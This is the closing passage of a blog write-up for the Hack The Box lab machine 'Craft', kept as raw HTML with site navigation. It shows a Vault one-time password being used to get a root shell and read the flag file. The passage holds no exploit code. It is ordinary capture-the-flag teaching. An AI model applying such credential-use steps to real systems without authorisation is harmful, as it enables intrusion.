<span class="k">*</span>  <span class="k">*</span> @<span class="o">()</span>Ooc<span class="o">()</span><span class="k">*</span>   o  <span class="nb">.</span>
    <span class="o">(</span>Q@<span class="k">*</span>0CG<span class="k">*</span>O<span class="o">()</span>  ___
   |<span class="se">\_</span>________/|/ _ <span class="se">\</span>
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | <span class="se">\_</span>| |
   |  |  |  |  |<span class="se">\_</span>__/
   |<span class="se">\_</span>|__|__|_/|
    <span class="se">\_</span>________/



Password: 
</pre></table></code></div></div><p>The password is simply just the OTP generated for the session, which is <code class="language-plaintext highlighter-rouge">f80f58e4-6ec7-dcdf-b491-f2ee66a89260</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>Password: 
Linux craft.htb 4.9.0-8-amd64 <span class="c">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 27 04:53:14 2019
root@craft:~# <span class="nb">cat </span>root.txt
831dXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/vault/" class="post-tag no-text-decoration" >vault</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a> <a href="/tags/mysql/" class="post-tag no-text-decoration" >mysql</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Craft - rizemon's blog&url=https://rizemon.github.io/posts/craft-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Craft - rizemon's blog&u=https://rizemon.github.io/posts/craft-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Craft - rizemon's blog&url=https://rizemon.github.io/posts/craft-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/bastard-htb/"><div class="card-body"> <span class="timeago small" > Jan 12, 2021 <i class="unloaded">2021-01-12T23:08:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Bastard (Without Metasploit)</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div></div></a></div><div class="card"> <a href="/posts/delivery-htb/"><div class="card-body"> <span class="timeago small" > May 23, 2021 <i class="unloaded">2021-05-23T03:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Delivery</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div></div></a></div><div class="card"> <a href="/posts/bastion-htb/"><div class="card-body"> <span class="timeago small" > Sep 7, 2019 <i class="unloaded">2019-09-07T23:11:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Bastion</h3><div class="text-muted small"><p> I found this machine a little hard at first as this was my first Windows machine and I wasn’t adept at exploiting Windows. After reading various write ups and guides online, I was able to root this...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/heist-htb/" class="btn btn-outline-primary"><p>Hack The Box - Heist</p></a> <a href="/posts/json-htb/" class="btn btn-outline-primary"><p>Hack The Box - Json</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
